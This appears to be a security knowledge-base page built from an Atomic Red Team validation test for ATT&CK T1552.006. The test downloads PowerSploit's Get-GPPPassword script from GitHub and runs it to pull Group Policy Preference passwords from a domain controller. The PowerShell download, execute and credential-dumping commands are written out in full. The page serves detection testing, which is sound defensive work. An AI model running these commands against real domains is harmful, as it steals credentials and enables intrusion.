---
atomic_guid: "e9584f82-322c-474a-b831-940fd8b4455c"
title: "GPP Passwords (Get-GPPPassword)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1552.006"
attack_technique_name: "Unsecured Credentials: Group Policy Preferences"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "e9584f82-322c-474a-b831-940fd8b4455c"
  - "GPP Passwords (Get-GPPPassword)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
This test is intended to be run from a domain joined workstation, not on the Domain Controller itself.
The Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.

Successful test execution will either display the credentials found in the GPP files or indicate "No preference files found".

## ATT&CK Mapping

- [[kb/attack/techniques/T1552-unsecured_credentials#^t1552006-group-policy-preferences|T1552.006: Group Policy Preferences]]

## Input Arguments

### gpp_script_path

- description: Path to the Get-GPPPassword PowerShell Script
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\Get-GPPPassword.ps1

### gpp_script_url

- description: URL of the Get-GPPPassword PowerShell Script
- type: url
- default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1

## Dependencies

Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}

### Prerequisite Check

```powershell
if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1 }
```

### Get Prerequisite

```powershell
New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
```

Computer must be domain joined

### Prerequisite Check

```powershell
if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Write-Host Joining this computer to a domain must be done manually
```

## Executor

- name: powershell

### Command

```powershell
. "#{gpp_script_path}"
Get-GPPPassword -Verbose
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.yaml)
